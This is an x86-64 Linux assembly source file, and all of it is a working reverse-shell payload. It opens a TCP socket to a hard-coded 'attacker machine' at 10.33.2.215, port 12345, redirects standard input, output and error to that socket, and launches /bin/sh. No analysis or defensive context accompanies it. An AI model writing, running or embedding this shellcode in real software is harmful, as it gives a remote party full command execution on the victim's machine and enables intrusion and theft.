bits 64

global _start

section .bss
struc sockaddr_in
        sin_family      resw 1
        sin_port        resw 1
        sin_addr        resd 1
endstruc
sock_fd resd 1

section .rodata
sh_path db "/bin/sh", 0
init_struct:
        istruc sockaddr_in                      
                at sin_family,  dw 2            ; AF_INET (IPv4)
                at sin_port,    dw 0x3930       ; Port 12345 (little-endian)
                at sin_addr,    dd 0xD702210A   ; IP 10.33.2.215 (little-endian)
        iend

section .text
_start:
        ; Create socket
        mov rax, 41                             ; syscall: socket
        mov rdi, 2                              ; domain: AF_INET (IPv4)
        mov rsi, 1                              ; type: SOCK_STREAM
        mov rdx, 6                              ; protocol: IPPROTO_TCP
        syscall
        mov [sock_fd], rax                      ; Save socket FD

connect_socket:
        ; Connect to attacker machine
        mov rax, 42                             ; syscall: connect
        mov rdi, [sock_fd]                      ; socket FD
        mov rsi, init_struct                    ; sockaddr_in struct
        mov rdx, 16                             ; size of sockaddr_in
        syscall

dup_stdin:
        ; Duplicate socket FD to stdin (0)
        mov rax, 33                             ; syscall: dup2
        mov rdi, [sock_fd]
        mov rsi, 0
        syscall

dup_stdout:
        ; Duplicate socket FD to stdout (1)
        mov rax, 33
        mov rdi, [sock_fd]
        mov rsi, 1
        syscall

dup_stderr:
        ; Duplicate socket FD to stderr (2)
        mov rax, 33
        mov rdi, [sock_fd]
        mov rsi, 2
        syscall

init_shell:
        ; Execute /bin/sh shell
        mov rax, 59                             ; syscall: execve
        mov rdi, sh_path                        ; path to /bin/sh
        xor rsi, rsi                            ; argv = NULL
        xor rdx, rdx                            ; envp = NULL
        syscall

